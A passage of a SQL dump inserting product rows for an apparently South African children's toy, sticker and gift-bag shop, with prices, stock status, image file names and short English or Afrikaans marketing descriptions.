(234, 'Mini Frisbee - Neon Yellow', 5, 'In Stock', 'Mini Frisbee Yellow.JPG', 10, 19, NULL, 0, 0, NULL, '00652', '100mm diameter\r\n<br/>Toy that provides exercise and improves eye-hand coordination.\r\n<br/>Perfect for party packs, Christmas stockings, Santa Shoe boxes and many more.\r\n<br/>Buy for a child today and give fun, exercise and physical development.', 18, 18, 18, 0),
(235, 'Mini Frisbee - Neon Pink', 5, 'In Stock', 'Mini Frisbee neon pink.JPG', 10, 19, NULL, 0, 0, NULL, '00653', '100mm diameter\r\n<br/>Toy that provides exercise and improves eye-hand coordination.\r\n<br/>Perfect for party packs, Christmas stockings, Santa Shoe boxes and many more.\r\n<br/>Buy for a child today and give fun, exercise and physical development.', 19, 19, 19, 0);
INSERT INTO `product` (`productID`, `productName`, `productPrice`, `productStockStatus`, `productFileName`, `category1ID`, `category2ID`, `category3ID`, `productFeatured`, `productSpecial`, `productSpecialPrice`, `productCode`, `productDescription`, `productPosition1`, `productPosition2`, `productPosition3`, `productHidden`) VALUES
(236, 'Blue Bears Stickers - Moon', 8.5, 'In Stock', 'Bear stickers Moon.JPG', 9, 12, 15, 0, 0, NULL, '00648', 'W: 70mm H: 165mm\r\n<br/>Excellent creative toy.\r\n<br/>Great for decorating greeting cards, cell phones, books, toys, etcetera.\r\n<br/>Use as finger puppets and hold your own shows.\r\n<br/>Ideal for Christmas stockings, party bags, small prizes and lots more.\r\n<br/>Buy and donate to a Children\'s Home and brighten a child\'s day.', 91, 64, 37, 0),
(237, 'Blue Bears Stickers - Dancing', 8.5, 'In Stock', 'Bear sticker Dancing.JPG', 9, 12, 15, 0, 0, NULL, '00649', 'W: 70mm H: 165mm\r\n<br/>Excellent creative toy.\r\n<br/>Great for decorating greeting cards, cell phones, books, toys, etcetera.\r\n<br/>Use as finger puppets and hold your own shows.\r\n<br/>Ideal for Christmas stockings, party bags, small prizes and lots more.\r\n<br/>Buy and donate to a Children\'s Home and brighten a child\'s day.', 92, 65, 38, 0),
(238, 'Fairies Stickers - Purple', 8.5, 'In Stock', 'Fairies stickers - purple.JPG', 9, 12, 15, 0, 0, NULL, '00654', 'W: 70mm H: 165mm\r\n<br/>Excellent creative toy.\r\n<br/>Great for decorating greeting cards, cell phones, books, toys, etcetera.\r\n<br/>Use as finger puppets and hold your own shows.\r\n<br/>Ideal for Christmas stockings, party bags, small prizes and lots more.\r\n<br/>Buy and donate to a Children\'s Home and brighten a child\'s day.', 93, 66, 39, 0),
(263, 'Small flat Birthday phrases sticker', 12, 'In Stock', 'Birthday Wish Phrases.JPG', 9, 35, NULL, 0, 0, NULL, '00684', 'Sheet Size:<br/> Width: 119mm <br/> Height: 170mm', 94, 67, 40, 0),
(264, 'Small flat Verjaardagfrases sticker', 12, 'In Stock', 'Verjaardagwense .JPG', 9, 35, NULL, 0, 0, NULL, '00685', 'Sheet Size: <br/>\r\nWidth: 119mm <br/>\r\nHeight: 170mm', 95, 68, 41, 0),
(265, 'Educational Activity Pack 21 Creativity - Colour in Dolphin', 30, 'In Stock', 'Educ act 21 creativity beach ball - wings eng final.JPG', 19, 22, NULL, 0, 0, NULL, '00691', 'Pack contains 2 A4 sheets, 88 10mm round labels, 72 star labels and 1 Dog Mix sticker sheet. Colours of labels may differ from picture. \r\n<br/>The activities develop midline crossing and fine motor skills, creativity, decision-making and imagination. It increases general knowledge if facts are shared. It also provides opportunities to practice oral presentations through story telling.\r\n<br/>Add your own creative and educational ideas. <br/>There is NO right or wrong. It is pure developmental FUN!!! \r\n<br/>Buy it NOW!\r\n', 2, 2, 15, 0),
(266, 'Educational Activity Pack 23 - Creativity - Dinosaurs', 30, 'In Stock', 'educ act pack 23 full colour dinos eng wings final.JPG', 19, 22, NULL, 0, 0, NULL, '00693', 'Pack contains 2 A4 sheets, 88 10mm round labels, 72 star labels and 1 Big Cat Mix sticker sheet. Colours of labels may differ from picture. \r\n<br/>The activities develop midline crossing and fine motor skills, creativity, decision-making and imagination. It increases general knowledge if facts are shared. It also provides opportunities to practice oral presentations through story telling. Stickers can also be used as finger puppets and puppet shows can be performed.\r\n<br/>Add your own creative and educational ideas. <br/>There is NO right or wrong. It is pure developmental FUN!!! \r\n<br/>Buy it NOW!\r\n', 1, 1, 16, 0),
(267, 'Educational Activity Pack 25 - Creativity - Colour in Dinosaurs', 30, 'In Stock', 'educ act pack 25 colour in dinos wings eng final.JPG', 19, 22, NULL, 0, 0, NULL, '00695', 'Pack contains 2 A4 sheets, 88 10mm round labels, 72 star labels and 1 Big Cat Mix sticker sheet. Colours of labels may differ from picture. \r\n<br/>The activities develop midline crossing and fine motor skills, creativity, decision-making and imagination. It increases general knowledge if facts are shared. It also provides opportunities to practice oral presentations through story telling.\r\n<br/>Add your own creative and educational ideas. <br/>There is NO right or wrong. It is pure developmental FUN!!! \r\n<br/>Buy it NOW!\r\n', 0, 0, 17, 0),
(268, 'Opvoedkundige Aktiwiteitspak 22 - Kreatiwiteit - Kleur Dolfyn in', 30, 'In Stock', 'Educ Act pack 22 kreat strandbal vlerke afr - final.JPG', 19, 21, NULL, 0, 0, NULL, '00692', 'Pack is AFRIKAANS. Pack contains 2 A4 sheets, 88 10mm round labels, 72 star labels and 1 Dog Mix sticker sheet. Colours of labels may differ from picture. \r\n<br/>The activities develop midline crossing and fine motor skills, creativity, decision-making and imagination. It increases general knowledge if facts are shared. It also provides opportunities to practice oral presentations through story telling.\r\n<br/>Add your own creative and educational ideas. <br/>There is NO right or wrong. It is pure developmental FUN!!! \r\n<br/>Buy it NOW!\r\n', 13, 3, 18, 0),
(269, 'Opvoedkundige Aktiwiteitspak 24 -  Kreatiwiteit - Dinosourusse', 30, 'In Stock', 'opv akt pak 24 volkleur dinos afr vlerke finaal.JPG', 19, 21, NULL, 0, 0, NULL, '00694', 'Pack is AFRIKAANS. Pack contains 2 A4 sheets, 88 10mm round labels, 72 star labels and 1 Big Cat Mix sticker sheet. Colours of labels may differ from picture. \r\n<br/>The activities develop midline crossing and fine motor skills, creativity, decision-making and imagination. It increases general knowledge if facts are shared. It also provides opportunities to practice oral presentations through story telling.\r\n<br/>Add your own creative and educational ideas. <br/>There is NO right or wrong. It is pure developmental FUN!!! \r\n<br/>Buy it NOW!\r\n', 12, 2, 19, 0),
(270, 'Opvoedkundige Aktiwiteitspak 26 - Kreatiwiteit - Kleur Dinosourusse in', 30, 'In Stock', 'opv akt pak 26 kleur dinos in afr vlerke finaal.JPG', 19, 21, NULL, 0, 0, NULL, '00696', 'Pack is AFRIKAANS. Pack contains 2 A4 sheets, 88 10mm round labels, 72 star labels and 1 Big Cat Mix sticker sheet. Colours of labels may differ from picture. \r\n<br/>The activities develop midline crossing and fine motor skills, creativity, decision-making and imagination. It increases general knowledge if facts are shared. It also provides opportunities to practice oral presentations through story telling.\r\n<br/>Add your own creative and educational ideas. <br/>There is NO right or wrong. It is pure developmental FUN!!! \r\n<br/>Buy it NOW!\r\n', 11, 1, 20, 0),
(271, 'Educational Activity Pack 19 - Numbers 1 to 10', 30, 'In Stock', 'educ act pack 19 - Eng 1 - 10 wings.JPG', 19, 22, NULL, 0, 0, NULL, '00657', 'Pack contains 2 A4 sheets and 152 star labels. Colours of labels may differ from picture. \r\n<br/>The activities develop midline crossing and fine motor skills, number concepts, concentration and memory. \r\n<br/>Add your own educational ideas.\r\n<br/>Buy it NOW!\r\n', 3, 3, 21, 0),
(272, 'Opvoedkundige Aktiwiteitspak 20 - Nommers 1 tot 10', 30, 'In Stock', 'Educ act pack 20 Afr 1-10 vlerke.JPG', 19, 21, NULL, 0, 0, NULL, '00658', 'Pack is AFRIKAANS.<br/>Pack contains 2 A4 sheets and 152 star labels. Colours of labels may differ from picture. \r\n<br/>The activities develop midline crossing and fine motor skills, number concepts, concentration and memory.\r\n<br/>Add your own educational ideas. \r\n<br/>Buy it NOW!\r\n', 14, 0, 22, 0),
(273, 'Plastic Eyes - Red', 12, 'In Stock', 'Red Eyes.JPG', 21, 25, NULL, 0, 0, NULL, '00697', '15mm in diameter', 1, 1, 1, 0),
(274, 'Plastic Eyes - Blue', 12, 'In Stock', 'Blue Eyes.JPG', 21, 25, NULL, 0, 0, NULL, '00698', '15mm in diameter', 2, 2, 2, 0),
(275, 'Plastic Eyes - Pink', 12, 'In Stock', 'Pink Eyes.JPG', 21, 25, NULL, 1, 0, NULL, '00699', '15mm diameter', 3, 3, 3, 0),
(276, 'Pick up Sticks', 30, 'In Stock', 'Pick-Up-Sticks.JPG', 10, 19, NULL, 0, 0, NULL, '00475', 'Game that develops finger dexterity and concentration. <br/>Provides hours of fun. <br/>Can be played alone.', 20, 20, 20, 0),
(277, 'Double Bottle Brown Kraft Bag', 20, 'In Stock', 'double_bottle.jpg', 4, 3, 3, 0, 0, NULL, '00342', 'Height: 37cm <br/> Width: 20cm <br/> Gusset: 9cm', 27, 2, 0, 0),
(280, 'Capsule creatures - Unicorns', 19, 'Out of Stock', 'Unicorn Caps Creatures.JPG', 10, 16, NULL, 0, 0, NULL, '00688', '', 5, 22, 22, 0),
(281, 'Puffy Velvet sticker - Ponies', 29, 'In Stock', 'Velvet - ponies.jpg', 9, 12, 16, 0, 0, NULL, '00707', 'Packet size: <br/> H: 25.8cm <br/> W: 14.5cm', 98, 70, 2, 0),
(282, 'Puffy Velvet sticker - Dolphins', 29, 'In Stock', 'velvet -dolphins.jpg', 9, 12, 16, 0, 0, NULL, '00708', 'Packet size: <br/> H: 25.8cm <br/> W: 14.5cm', 99, 71, 3, 0),
(283, 'Puffy Dress-up sticker PDA - green', 17, 'In Stock', 'PDA Puffy Dress-Up green.JPG', 9, 12, 16, 0, 0, NULL, '00700', 'Packet size <br/> H: 19.5cm <br/> W: 11cm', 100, 72, 4, 0),
(284, 'Puffy Dress-up sticker PDA - turquoise', 17, 'In Stock', 'PDA Puffy Dress-up turquoise.JPG', 9, 12, 16, 0, 0, NULL, '00701', 'Packet size <br/> H: 19.5cm <br/> W: 11cm', 101, 73, 5, 0),
(285, 'Puffy Dress-up sticker PDA - Purple', 17, 'In Stock', 'PDA Puffy Dress-Up Purple.JPG', 9, 12, 16, 0, 0, NULL, '00702', 'Packet size <br/> H: 19.5cm <br/> W: 11cm', 102, 74, 6, 0),
(286, 'Pop-Up Sticker 566-001226 - Princess', 17, 'In Stock', 'Pop-Up360 castle.JPG', 9, 12, 16, 0, 0, NULL, '00703', 'Packet size: <br/> H: 25.8cm <br/> W: 14.5cm', 103, 75, 7, 0),
(287, 'Pop-Up Sticker 566-001226 - Ballerina', 17, 'In Stock', 'Pop-up360 ballerina.JPG', 9, 12, 16, 0, 0, NULL, '00704', 'Packet size: <br/> H: 25.8cm <br/> W: 14.5cm', 104, 76, 8, 0),
(288, 'Pop-Up Sticker 566-001226 - Friends', 17, 'In Stock', 'Pop-up360 friends.JPG', 9, 12, 16, 0, 0, NULL, '00705', 'Packet size: <br/> H: 25.8cm <br/> W: 14.5cm', 105, 77, 9, 0),
(289, 'Pop-Up Sticker 566-001226 - Birthday', 17, 'In Stock', 'Pop-Up360 Party.JPG', 9, 12, 16, 0, 0, NULL, '00706', 'Packet size: <br/> H: 25.8cm <br/> W: 14.5cm', 106, 78, 10, 0),
(290, 'Puffy Velvet sticker - Cats', 29, 'In Stock', 'Velvet - cats.JPG', 9, 12, 16, 0, 0, NULL, '00709', 'Packet size: <br/> H: 25.8cm <br/> W: 14.5cm', 96, 79, 1, 0),
(291, 'Puffy Velvet sticker - Dogs', 29, 'In Stock', 'Velvet - dogs.JPG', 9, 12, 16, 0, 0, NULL, '00710', 'Packet size: <br/> H: 25.8cm <br/> W: 14.5cm', 97, 80, 0, 0),
(292, 'Glitter Sticker 566-000066 Dolphins ', 20, 'In Stock', 'Glitter - dolphins.JPG', 9, 12, 15, 0, 0, NULL, '00711', 'Packet size: <br/> H: 25.8cm <br/> W: 14.5cm', 107, 81, 42, 0),
(293, 'Glitter Sticker 566-000066 Stars', 20, 'In Stock', 'Glitter - stars.JPG', 9, 12, 15, 0, 0, NULL, '00712', 'Packet size: <br/> H: 25.8cm <br/> W: 14.5cm', 109, 82, 43, 0),
(294, 'Glitter Sticker 566-000066 Space', 20, 'In Stock', 'Glitter - space.JPG', 9, 12, 15, 0, 0, NULL, '00713', 'Packet size: <br/> H: 25.8cm <br/> W: 14.5cm', 110, 83, 44, 0),
(295, 'Glitter Sticker 566-000066 Fish', 20, 'In Stock', 'Glitter - sealife.JPG', 9, 12, 15, 0, 0, NULL, '00714', 'Packet size: <br/> H: 25.8cm <br/> W: 14.5cm', 108, 84, 45, 0),
(296, 'Bean Bag - Camouflage', 22, 'In Stock', 'Bean Bag - Camouflage.JPG', 10, 18, 21, 0, 0, NULL, '00719', '+- 13.5 x 13.5 cm.<br/> Contains real speckled beans. <br/><br/> Playing with bean bags can develop/improve eye-hand coordination, depth perception, muscles in the hand and arm and more. <br/>Improved abilities can improve self-confidence. <br/><br/> Can be played with fairly safely indoors, for example a passage, during the cold winter and hot summer months. <br/><br/> Different games can be played with it, for example throwing it into a bucket, hitting a target, etcetera. <br/><br/> Great for playing games at birthday parties, fundraisers, etcetera.<br/><br/>Ideal for Scout/Cub games.', 22, 23, 23, 0),
(297, 'Bean Bag - Navy', 22, 'In Stock', 'Bean Bag - Navy.JPG', 10, 18, 21, 0, 0, NULL, '00720', '+- 13.5 x 13.5 cm.<br/> Contains real speckled beans. <br/> <br/>Playing with bean bags can develop/improve eye-hand coordination, depth perception, muscles in the hand and arm and more. <br/><br/>Improved abilities can improve self-confidence. <br/><br/> Can be played with fairly safely indoors, for example a passage, during the cold winter and hot summer months. <br/><br/> Different games can be played with it, for example throwing it into a bucket, hitting a target, etcetera. <br/><br/> Great for playing games at birthday parties, fundraisers, etcetera.<br/><br/>Ideal for Scout/Cub games.', 23, 24, 24, 0),
(298, 'Bean Bag - Denim - Light', 22, 'In Stock', 'Bean Bag - Denim2.jpg', 10, 18, 21, 0, 0, NULL, '00721', '+- 13.5 x 13.5 cm.<br/> Contains real speckled beans. <br/><br/> Playing with bean bags can develop/improve eye-hand coordination, depth perception, muscles in the hand and arm and more. <br/><br/>Improved abilities can improve self-confidence. <br/><br/> Can be played with fairly safely indoors, for example a passage, during the cold winter and hot summer months. <br/><br/> Different games can be played with it, for example throwing it into a bucket, hitting a target, etcetera. <br/><br/> Great for playing games at birthday parties, fundraisers, etcetera.<br/><br/>Ideal for Scout/Cub games.', 24, 25, 25, 0),
(300, 'SPARKLE STICKER CLA3111V Space', 19.5, 'In Stock', 'Sparkle - Space.JPG', 9, 12, 16, 0, 0, NULL, '00724', 'Packet size: <br/> H: 25.6cm <br/> W: 14.5cm', 111, 85, 46, 0),
(303, 'SPARKLE STICKER CLA3104V Butterfly', 19.5, 'In Stock', 'Sparkle - butterflies - reduced size.JPG', 9, 12, 16, 0, 0, NULL, '00725', 'Packet size: <br/> H: 25.6cm <br/> W: 14.5cm', 112, 86, 47, 0),
(304, 'SPARKLE STICKER CLA3109V Robot', 19.5, 'In Stock', 'Sparkle robot - reduced size.JPG', 9, 12, 16, 0, 0, NULL, '00726', 'Packet size: <br/> H: 25.6cm <br/> W: 14.5cm', 113, 87, 48, 0),
(305, 'SPARKLE STICKER CLA3103V Wild Animals', 19.5, 'In Stock', 'Sparkle - wild animals - reduced size.JPG', 9, 12, 16, 0, 0, NULL, '00727', 'Packet size: <br/> H: 25.6cm <br/> W: 14.5cm', 114, 88, 49, 0),
(306, 'Unicorn sticker - no wings CLA7131V (1602)', 35, 'In Stock', 'Unicorn 1602 CLA7131V  no wings - reduced size.JPG', 9, 12, 16, 0, 0, NULL, '00728', 'Packet size: <br/> H: 25cm <br/> W: 14.5cm', 115, 89, 50, 0),
(307, 'Unicorn sticker - wings CLA7117V (1602)', 35, 'In Stock', 'Unicorn 1602 CLA7117V  wings - reduced size.JPG', 9, 12, 16, 0, 0, NULL, '00729', 'Packet size: <br/> H: 25cm <br/> W: 14.5cm', 116, 90, 51, 0),
(308, 'Medium Fancy Bag - Light Pink high heels  ', 15.5, 'In Stock', 'IMG_7435.JPG', 4, 3, 6, 0, 0, NULL, '00730', 'Height: 23cm <br/> Width: 18cm <br/> Gusset: 10cm', 34, 9, 7, 0),
(309, 'Medium Fancy Bag - Cream high heels  ', 15.5, 'In Stock', 'Med F cream high heels  reduced.JPG', 4, 3, 6, 0, 0, NULL, '00731', 'Height: 23cm <br/> Width: 18cm <br/> Gusset: 10cm', 35, 10, 8, 0),
(310, 'Med Fancy Bag - Pink crown & watch ', 15.5, 'In Stock', 'Med F Pink crown watch reduced.JPG', 4, 3, 6, 0, 0, NULL, '00732', 'Height: 23cm <br/> Width: 18cm <br/> Gusset: 10cm', 36, 11, 9, 0),
(311, 'Medium  Fancy Bag - Purple high heels  ', 15.5, 'In Stock', 'Med F Purple high heels  reduced.JPG', 4, 3, 6, 0, 0, NULL, '00733', 'Height: 23cm <br/> Width: 18cm <br/> Gusset: 10cm', 37, 12, 10, 0),
(312, 'Medium Fancy Bag -  Eiffel Tower with lace', 15.5, 'In Stock', 'Medium F Eiffel Tower with lace reduced.JPG', 4, 3, 6, 0, 0, NULL, '00734', '', 38, 13, 11, 0),
(313, 'Medium Fancy Bag - Animal skin with glitter ', 15.5, 'In Stock', 'Medium Fancy Bag - Animal skin with glitter reduced.JPG', 4, 3, 6, 0, 0, NULL, '00735', '', 39, 14, 12, 0),
(314, 'Medium Fancy Bag - Baby on milk bottle ', 15.5, 'In Stock', 'Medium Fancy Bag - Baby on milk bottle reduced.JPG', 4, 3, 6, 0, 0, NULL, '00736', '', 40, 15, 13, 0),
(315, 'Medium Fancy Bag - Black dress Eiffel Tower ', 15.5, 'In Stock', 'Medium Fancy Bag - Black dress Eiffel Tower reduced.JPG', 4, 3, 6, 0, 0, NULL, '00737', '', 41, 16, 14, 0),
(316, 'Medium Fancy Bag - Coffee Heart ', 15.5, 'In Stock', 'Medium Fancy Bag - Coffee Heart reduced.JPG', 4, 3, 6, 0, 0, NULL, '00738', '', 42, 17, 15, 0),
(317, 'Medium Fancy Bag - Daisies in striped pot', 15.5, 'In Stock', 'Medium Fancy Bag - Daisies in striped pot reduced.JPG', 4, 3, 6, 0, 0, NULL, '00739', '', 43, 18, 16, 0),
(318, 'Medium Fancy Bag - Happy Bday pink & green stripes ', 15.5, 'In Stock', 'Medium Fancy Bag - Happy Bday pink & green stripes reduced.JPG', 4, 3, 6, 0, 0, NULL, '00740', '', 44, 19, 17, 0),
(319, 'Medium Fancy Bag - Purple wedding venue ', 15.5, 'In Stock', 'Medium Fancy Bag - Purple wedding venue reduced.JPG', 4, 3, 6, 0, 0, NULL, '00741', '', 45, 20, 18, 0),
(320, 'Medium Fancy Bag - Red carriage bicycle ', 15.5, 'In Stock', 'Medium Fancy Bag - Red carriage bicycle reduced.JPG', 4, 3, 6, 0, 0, NULL, '00742', '', 46, 21, 19, 0),
(321, 'Medium Fancy Bag - Sunflowers in Jug ', 15.5, 'In Stock', 'Medium Fancy Bag - Sunflowers in Jug reduced.JPG', 4, 3, 6, 0, 0, NULL, '00743', '', 47, 22, 20, 0),
(322, 'Medium Fancy Bag - Tulips in bucket ', 15.5, 'In Stock', 'Medium Fancy Bag - Tulips in bucket reduced.JPG', 4, 3, 6, 0, 0, NULL, '00744', '', 48, 23, 21, 0),
(323, 'DDD Puffy Sticker - Transport', 11, 'In Stock', 'Stickers - DDD-010 Transport reduced.JPG', 9, 12, 16, 0, 0, NULL, '00715', 'Packet size: <br/> H: 26cm <br/> W: 19cm', 117, 91, 52, 0),
(330, 'PU-200 Puffy Stickers - 3 doggies', 12, 'In Stock', 'PU-200 Puffy Stickers - 3 doggies reduced.JPG', 9, 12, 16, 0, 0, NULL, '00749', 'Packet size: <br/> H: 14.3cm <br/> W: 13.8cm', 124, 98, 59, 0),
(331, 'PU-200 Puffy Stickers - 3 kitties ', 12, 'In Stock', 'PU-200 Puffy Stickers - 3 kitties reduced.JPG', 9, 12, 16, 0, 0, NULL, '00750', 'Packet size: <br/> H: 14.3cm <br/> W: 13.8cm', 125, 99, 60, 0),
(332, 'PU-200 Puffy Stickers - blue elephant ', 12, 'In Stock', 'PU-200 Puffy Stickers - blue elephant reduced.JPG', 9, 12, 16, 0, 0, NULL, '00751', 'Packet size: <br/> H: 14.3cm <br/> W: 13.8cm', 126, 100, 61, 0),
(333, 'PU-200 Puffy Stickers - dalmation ', 12, 'In Stock', 'PU-200 Puffy Stickers - dalmation reduced.JPG', 9, 12, 16, 0, 0, NULL, '00752', 'Packet size: <br/> H: 14.3cm <br/> W: 13.8cm', 127, 101, 62, 0),
(334, 'PU-200 Puffy Stickers - giraffe ', 12, 'In Stock', 'PU-200 Puffy Stickers - giraffe reduced.JPG', 9, 12, 16, 0, 0, NULL, '00753', 'Packet size: <br/> H: 14.3cm <br/> W: 13.8cm', 128, 102, 63, 0),
(335, 'PU-200 Puffy Stickers - lion ', 12, 'In Stock', 'PU-200 Puffy Stickers - lion reduced.JPG', 9, 12, 16, 0, 0, NULL, '00754', 'Packet size: <br/> H: 14.3cm <br/> W: 13.8cm', 129, 103, 64, 0),
(336, 'PU-200 Puffy Stickers - pink cat', 12, 'In Stock', 'PU-200 Puffy Stickers - pink cat reduced.JPG', 9, 12, 16, 0, 0, NULL, '00755', 'Packet size: <br/> H: 14.3cm <br/> W: 13.8cm', 130, 104, 65, 0),
(337, 'PU-200 Puffy Stickers - tiger', 12, 'In Stock', 'PU-200 Puffy Stickers - tiger reduced.JPG', 9, 12, 16, 0, 0, NULL, '00756', 'Packet size: <br/> H: 14.3cm <br/> W: 13.8cm', 131, 105, 66, 0),
(338, 'DF-002 Puffy Sticker -Butterflies 2 ', 12, 'In Stock', 'DF-002 Puffy Sticker -Butterflies 2 - reduced.JPG', 9, 12, 16, 0, 0, NULL, '00757', 'Packet size: <br/> H: 22.5cm <br/> W: 11cm', 132, 106, 67, 0),
(339, 'DF-006 Puffy Sticker - Red Roses ', 12, 'In Stock', 'DF-006 Puffy Sticker - Red Roses - reduced.JPG', 9, 12, 16, 0, 0, NULL, '00758', 'Packet size: <br/> H: 22.5cm <br/> W: 11cm', 133, 107, 68, 0),
(340, 'DF-088 Puffy Sticker - Sea Life 1', 12, 'In Stock', 'DF-088 Puffy Sticker - Sea Life 1- reduced.JPG', 9, 12, 16, 0, 0, NULL, '00759', 'Packet size: <br/> H: 22.5cm <br/> W: 11cm', 134, 108, 69, 0),
(341, 'DF-091 Puffy Sticker - Animals ', 12, 'In Stock', 'DF-091 Puffy Sticker - Animals - reduced.JPG', 9, 12, 16, 0, 0, NULL, '00760', 'Packet size: <br/> H: 22.5cm <br/> W: 11cm', 135, 109, 70, 0),
(342, 'DF-094 Puffy Sticker - Landmarks ', 12, 'In Stock', 'DF-094 Puffy Sticker - Landmarks - reduced.JPG', 9, 12, 16, 0, 0, NULL, '00761', 'Packet size: <br/> H: 22.5cm <br/> W: 11cm', 136, 110, 71, 0),
(343, 'DF-097 Puffy Sticker - Smiley Faces ', 12, 'In Stock', 'DF-097 Puffy Sticker - Smiley Faces - reduced.JPG', 9, 12, 16, 0, 0, NULL, '00762', 'Packet size: <br/> H: 22.5cm <br/> W: 11cm', 137, 111, 72, 0),
(344, 'DF-107 Puffy Sticker - Sea Life 2 ', 12, 'In Stock', 'DF-107 Puffy Sticker - Sea Life 2 - reduced.JPG', 9, 12, 16, 0, 0, NULL, '00763', 'Packet size: <br/> H: 22.5cm <br/> W: 11cm', 138, 112, 73, 0),
(345, 'DFC-003 Puffy Sticker -Butterflies 1', 12, 'In Stock', 'DFC-003 Puffy Sticker -Butterflies 1- reduced.JPG', 9, 12, 16, 0, 0, NULL, '00764', 'Packet size: <br/> H: 22.5cm <br/> W: 11cm', 139, 113, 74, 0),
(347, 'Crystal Dolphin Stickers - blue ', 10, 'In Stock', 'Crystal Dolphin Stickers - Blue reduced.JPG', 9, 12, 16, 0, 0, NULL, '00766', 'Packet size: <br/> H: 16cm <br/> W: 8.6cm', 141, 115, 76, 0),
(348, 'Crystal Dolphin Stickers - black ', 10, 'In Stock', 'Crystal Dolphin Stickers - black reduced.JPG', 9, 12, 16, 0, 0, NULL, '00767', 'Packet size: <br/> H: 16cm <br/> W: 8.6cm', 142, 116, 77, 0),
(349, '3D Sealife  Stickers 005A ', 11, 'In Stock', '3D Sealife  Stickers 005A reduced.JPG', 9, 12, 16, 0, 0, NULL, '00768', 'Packet size: <br/> H: 16cm <br/> W: 8cm', 143, 117, 78, 0),
(350, '3D Sealife  Stickers 005B ', 11, 'In Stock', '3D Sealife  Stickers 005B reduced.JPG', 9, 12, 16, 0, 0, NULL, '00769', 'Packet size: <br/> H: 16cm <br/> W: 8cm', 144, 118, 79, 0),
(351, '3D Sealife  Stickers 005C ', 11, 'In Stock', '3D Sealife  Stickers 005C reduced.JPG', 9, 12, 16, 0, 0, NULL, '00770', 'Packet size: <br/> H: 16cm <br/> W: 8cm', 145, 119, 80, 0),
(352, 'E-18 Puffy Stickers- Giraffe', 14, 'In Stock', 'E-18 Puffy Stickers- Giraffe Reduced.JPG', 9, 12, 16, 0, 0, 10, '00771', 'Packet contains 1 free sticker sheet.<br/>\r\nPacket size: <br/> H: 28.5cm <br/> W: 16cm', 146, 120, 81, 0),
(353, 'E-23 Puffy Stickers - Horses', 14, 'In Stock', 'E-23 Puffy Stickers - Horses reduced.JPG', 9, 12, 16, 0, 0, 10, '00772', 'Packet contains 1 free sticker sheet.<br/>\r\nPacket size: <br/> H: 28.5cm <br/> W: 16cm\r\n', 147, 121, 82, 0),
(354, 'E-07 Puffy Stickers - Zoo', 14, 'In Stock', 'E-07 Puffy Stickers - Zoo reduced.JPG', 9, 12, 16, 0, 0, 10, '00773', 'Packet contains 1 free sticker sheet.<br/>\r\nPacket size: <br/> H: 28.5cm <br/> W: 16cm', 148, 122, 83, 0),
(355, 'E-08 Puffy Stickers - Toys', 14, 'In Stock', 'E08 Puffy Stickers Toys reduced.JPG', 9, 12, 16, 0, 0, 10, '00774', 'Packet contains 1 free sticker sheet.<br/>\r\nPacket size: <br/> H: 28.5cm <br/> W: 16cm', 149, 123, 84, 0),
(356, 'E-22 Puffy Stickers - Tigers', 14, 'In Stock', 'E22 Puffy Stickers Tigers reduced.JPG', 9, 12, 16, 0, 0, 10, '00775', 'Packet contains 1 free sticker sheet.<br/>\r\nPacket size: <br/> H: 28.5cm <br/> W: 16cm', 150, 124, 85, 0),
(357, 'E-06 Puffy Stickers - Duck', 14, 'In Stock', 'E06 Puffy Stickers Duck reduced.JPG', 9, 12, 16, 0, 0, 10, '00776', 'Packet contains 1 free sticker sheet.<br/>\r\nPacket size: <br/> H: 28.5cm <br/> W: 16cm', 151, 125, 86, 0),
(358, 'E-31 Puffy Stickers - Farm animals', 14, 'In Stock', 'E31 Puffy Stickers Farm animals reduced.JPG', 9, 12, 16, 0, 0, 10, '00777', 'Packet contains 1 free sticker sheet.<br/>\r\nPacket size: <br/> H: 28.5cm <br/> W: 16cm', 152, 126, 87, 0),
(359, 'E-20 Puffy Stickers - Dogs', 14, 'In Stock', 'images.jpg', 9, 12, 16, 0, 0, 10, '00778', 'Packet contains 1 free sticker sheet.<br/>\r\nPacket size: <br/> H: 28.5cm <br/> W: 16cm', 153, 127, 88, 0),
(362, 'Dinosaur - 1 - pinkish', 15, 'In Stock', 'Dinosaur 1 pinkish reduced.JPG', 10, 19, NULL, 0, 0, NULL, '00782', 'H: 7cm <br/> W: 12cm', 27, 26, 26, 0),
(363, 'Dinosaur - 2 - brachio', 15, 'In Stock', 'Dinosaur  2  brachio reduced.JPG', 10, 19, NULL, 0, 0, NULL, '00783', 'H: 11.5cm <br/> W: 15cm', 28, 27, 27, 0),
(364, 'Dinosaur - 3 - spino - yellow', 15, 'In Stock', 'Dinosaur 3 spino - yellow reduced.JPG', 10, 19, NULL, 0, 0, NULL, '00784', 'H: 7cm <br/> W: 15cm', 29, 28, 28, 0),
(365, 'Dinosaur - 4 - stego blue', 15, 'In Stock', 'Dinosaur 4 stego blue reduced.JPG', 10, 19, NULL, 0, 0, NULL, '00785', 'H: 7.5cm <br/> W: 15cm', 30, 29, 29, 0),
(366, 'Dinosaur - 5 - ankylo green with red stripe', 15, 'In Stock', 'Dinosaur 5 ankylo green with red stripe reduced.JPG', 10, 19, NULL, 0, 0, NULL, '00786', 'H: 5cm <br/> W: 14cm', 31, 30, 30, 0),
(367, 'Dinosaur - 6 - T-Rex Two-tone brown/orange', 15, 'In Stock', 'Dinosaur  6 TRex Two-tone brownorange reduced.JPG', 10, 19, NULL, 0, 0, NULL, '00787', 'H: 10cm <br/> W: 17.5cm', 32, 31, 31, 0),
(368, 'Dinosaur - 7 - Red head', 15, 'In Stock', 'Dinosaur 7 Red head reduced.JPG', 10, 19, NULL, 0, 0, NULL, '00788', 'H: 11cm <br/> W: 14cm', 33, 32, 32, 0),
(369, 'Dinosaur - 8 - Para - green', 15, 'In Stock', 'Dinosaur  8 Para - green reduced.JPG', 10, 19, NULL, 0, 0, NULL, '00789', 'H: 12cm <br/> W: 15.5cm', 34, 33, 33, 0),
(370, 'Dinosaur - 9 - Allosaurus - brown', 15, 'In Stock', 'Dinosaur 9 Allosaurus - brown reduced.JPG', 10, 19, NULL, 0, 0, NULL, '00790', 'H: 14.5cm <br/> W: 15cm', 35, 34, 34, 0),
(371, 'Dinosaur - 10 - Igua - brown/green', 15, 'In Stock', 'Dinosaur 10  Igua browngreen reduced.JPG', 10, 19, NULL, 0, 0, NULL, '00791', 'H: 7.5cm <br/> W: 15cm', 36, 35, 35, 0),
